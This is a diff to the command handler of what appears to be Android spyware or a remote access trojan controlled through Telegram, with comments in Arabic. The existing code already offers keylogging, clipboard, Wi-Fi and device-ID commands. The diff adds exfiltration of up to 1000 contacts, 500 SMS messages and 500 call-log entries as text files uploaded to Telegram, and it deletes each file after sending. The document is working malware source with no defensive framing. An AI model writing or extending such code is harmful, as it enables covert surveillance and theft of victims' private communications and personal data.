@@ -8,6 +8,7 @@ import android.provider.Settings;
 import org.json.JSONArray;
 import org.json.JSONObject;
 import java.io.File;
+import java.io.FileWriter;
 import java.util.List;
 
 public class CommandHandler {
@@ -93,18 +94,31 @@ public class CommandHandler {
         if (cmd.equals("/keylog")) return "⌨️ Keylog:\n\n" + KeylogService.drain();
         if (cmd.equals("/clip")) return ClipboardHelper.read(ctx);
         if (cmd.equals("/wifi")) return WifiHelper.list(ctx);
+        
+        // === تعديل: إرسال جهات الاتصال كملف txt ===
         if (cmd.equals("/contacts")) {
-            List<String> l = ContactHelper.getContacts(ctx, 80);
-            return "📇 (" + l.size() + "):\n\n" + String.join("\n", l);
+            List<String> l = ContactHelper.getContacts(ctx, 1000);
+            if (l.isEmpty()) return "📇 لا توجد جهات اتصال";
+            sendAsTxtFile(l, "Contacts_" + System.currentTimeMillis() + ".txt", "📇 جهات الاتصال (" + l.size() + ")");
+            return null;
         }
+        
+        // === تعديل: إرسال الرسائل كملف txt ===
         if (cmd.equals("/sms")) {
-            List<String> l = SmsHelper.getSms(ctx, 40);
-            return "💬 (" + l.size() + "):\n\n" + String.join("\n\n", l);
+            List<String> l = SmsHelper.getSms(ctx, 500);
+            if (l.isEmpty()) return "💬 لا توجد رسائل";
+            sendAsTxtFile(l, "SMS_" + System.currentTimeMillis() + ".txt", "💬 الرسائل (" + l.size() + ")");
+            return null;
         }
+        
+        // === تعديل: إرسال المكالمات كملف txt ===
         if (cmd.equals("/calls")) {
-            List<String> l = CallLogHelper.getCallLog(ctx, 40);
-            return "📞 (" + l.size() + "):\n\n" + String.join("\n", l);
+            List<String> l = CallLogHelper.getCallLog(ctx, 500);
+            if (l.isEmpty()) return "📞 لا توجد مكالمات";
+            sendAsTxtFile(l, "Calls_" + System.currentTimeMillis() + ".txt", "📞 المكالمات (" + l.size() + ")");
+            return null;
         }
+
         if (cmd.equals("/device")) {
             return "📱 <b>الجهاز</b>\nالطراز: " + Build.MODEL + "\nالشركة: " + Build.MANUFACTURER + "\nأندرويد: " + Build.VERSION.RELEASE + "\nANDROID_ID: " + Settings.Secure.getString(ctx.getContentResolver(), Settings.Secure.ANDROID_ID);
         }
@@ -135,6 +149,28 @@ public class CommandHandler {
         }
         if (cmd.equals("/perms")) return "⚙️ فعّل الإشعارات والـ Accessibility من إعدادات الجهاز.";
         return "❓ " + cmd;
+    }
+
+    // === دالة مساعدة: تحويل القائمة إلى ملف txt وإرساله ===
+    private void sendAsTxtFile(List<String> lines, String fileName, String caption) {
+        try {
+            File file = new File(ctx.getCacheDir(), fileName);
+            FileWriter writer = new FileWriter(file);
+            
+            for (String line : lines) {
+                writer.write(line + "\n");
+            }
+            writer.close();
+
+            // إرسال الملف
+            TelegramSender.sendDocument(file, caption);
+            
+            // حذف الملف بعد إرساله لتوفير المساحة
+            file.delete();
+            
+        } catch (Exception e) {
+            TelegramSender.sendMessage("⚠️ خطأ في إنشاء الملف: " + e.getMessage());
+        }
     }
 
     private void answerCallback(String id) {
